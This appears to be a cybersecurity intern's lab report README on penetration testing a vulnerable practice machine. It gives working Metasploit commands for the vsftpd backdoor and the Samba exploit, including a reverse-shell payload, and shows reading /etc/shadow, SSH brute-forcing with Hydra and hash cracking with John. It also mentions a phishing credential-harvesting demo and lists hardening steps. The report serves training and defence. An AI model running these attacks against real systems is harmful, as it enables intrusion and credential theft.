# 💥 Task 4: Exploitation & System Security

> **Intern:** Diwakar Chandra | **ID:** APSPL2632803  
> **Timeline:** Days 37–48 | **Program:** ApexPlanet Cybersecurity Internship

---

## 🎯 Objective
Learn penetration testing workflow and exploit vulnerabilities responsibly.

---

## 🔄 Pentest Methodology

```
Recon → Scanning → Exploitation → Post-Exploitation → Reporting
```

---

## 💥 1. Metasploit Exploitation

```bash
# Launch Metasploit
msfconsole

# vsftpd 2.3.4 Backdoor
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.102
run
# Result: Root shell!

# Samba Exploit
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.56.102
set PAYLOAD cmd/unix/reverse
set LHOST 192.168.56.101
run
# Result: Root shell via Samba!
```

**Post-Exploitation:**
```bash
whoami          # root
cat /etc/shadow # Password hashes
ifconfig        # Network info
ps aux          # Running processes
```

---

## 🔑 2. Password Attacks

```bash
# Brute force SSH with Hydra
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.102
# Result: msfadmin:msfadmin found!

# Crack hashes with John the Ripper
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
john hashes.txt --show
# Result: Cracked in seconds!
```

---

## 🎭 3. Social Engineering

- Created phishing simulation page
- Demonstrated credential harvesting
- Security awareness training conducted
- **Key lesson:** MFA defeats credential theft

---

## 🦠 4. Malware Basics

| Type | Description |
|------|-------------|
| Virus | Self-replicating |
| Worm | Network propagating |
| Trojan | Disguised malware |
| Ransomware | Encrypts files |
| Spyware | Silent monitoring |

```bash
# Static analysis
file malware.exe
strings malware.exe
md5sum malware.exe
```

---

## 🛡️ 5. System Hardening

```bash
# Update system
sudo apt update && sudo apt upgrade -y

# Firewall rules
sudo iptables -P INPUT DROP
sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 23 -j DROP  # Block Telnet

# Disable unused services
sudo systemctl disable telnet
sudo systemctl disable ftp
```

---

## 📊 Key Findings

| Finding | Severity |
|---------|----------|
| vsftpd 2.3.4 Backdoor | 🔴 Critical |
| Samba RCE | 🔴 Critical |
| Weak SSH Credentials | 🟠 High |
| Telnet Enabled | 🟠 High |
| No Firewall | 🟠 High |

---

## 🔑 Key Takeaways

1. Metasploit makes exploitation easy — patch immediately
2. Weak passwords are cracked in seconds — use strong passwords + MFA
3. Social engineering bypasses all technical controls
4. System hardening removes entire attack vectors
5. Always document every step during a pentest

---

## 📌 Deliverables

| Deliverable | Status |
|-------------|--------|
| Penetration Testing Report PDF | ✅ Completed |
| GitHub Repository | ✅ Completed |
| 10-min Demo Video | ✅ Completed |

---

*ApexPlanet Cybersecurity Internship | www.apexplanet.in*
